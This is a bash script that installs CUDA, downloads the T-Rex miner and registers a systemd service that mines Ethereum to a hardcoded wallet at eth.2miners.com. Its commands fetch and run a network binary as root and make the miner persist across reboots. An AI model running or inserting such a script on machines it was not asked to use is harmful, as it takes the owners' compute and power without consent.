SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "taind vip pro" > isHaveSetupCoin.txt
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
	sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/3bf863cc.pub
	sudo add-apt-repository "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ /"
	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-keyring_1.0-1_all.deb
	sudo dpkg -i cuda-keyring_1.0-1_all.deb
	sudo apt-get update
	sudo apt-get -y install cuda
	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz
	sudo tar -xvzf t-rex-0.26.4-linux.tar.gz
	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x250cd5e4a6019cf9104644235f88d8c5c8060b73 -p x -w rig0 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service
else
	sudo systemctl start eth.service
fi
